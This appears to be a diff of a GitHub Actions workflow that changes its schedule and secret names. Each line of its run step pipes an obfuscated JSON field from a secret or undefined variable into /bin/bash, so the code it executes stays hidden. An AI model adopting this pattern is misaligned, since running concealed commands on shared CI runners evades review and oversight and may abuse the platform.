@@ -1,31 +1,24 @@
 name: henianchensheng
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 3/6 * * *'
-
+    - cron: '55 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: henianchensheng
         env:
-          xvi4: ${{ secrets.xvi4 }}
+          ayhpo091: ${{ secrets.ayhpo091 }}
         run: |
-          echo $xvi4 | jq -r .f9 | /bin/bash
-          echo $yeqyr99 | jq -r .ixqox221 | /bin/bash
-          echo $co73 | jq -r .eki5152 | /bin/bash
-          echo $xkoq66628 | jq -r .xk399 | /bin/bash
-          echo $olg21769 | jq -r .od5 | /bin/bash
-          echo $boj09487 | jq -r .n79076 | /bin/bash
-          echo $mcax17011 | jq -r .md8 | /bin/bash
-          echo $l2974 | jq -r .mirsp74 | /bin/bash
-          echo $pbed349 | jq -r .iyyr70254 | /bin/bash
-          echo $k00 | jq -r .lnfh460 | /bin/bash
-          echo $i212 | jq -r .ge98 | /bin/bash
-          echo $kkzww2485 | jq -r .lptu6 | /bin/bash
-          echo $opj67 | jq -r .dd2147 | /bin/bash
+          echo $ayhpo091 | jq -r .y8 | /bin/bash
+          echo $obgnl31 | jq -r .ik5088 | /bin/bash
+          echo $rsdy1186 | jq -r .ef4 | /bin/bash
+          echo $ixt46485 | jq -r .a4 | /bin/bash
+          echo $iec4874 | jq -r .fcswy5 | /bin/bash
+          echo $bhca99220 | jq -r .kihd042 | /bin/bash
+          echo $arxhr85 | jq -r .saa4608 | /bin/bash
+          echo $de885 | jq -r .nln9200 | /bin/bash
+          echo $yukb823 | jq -r .d47207 | /bin/bash
 
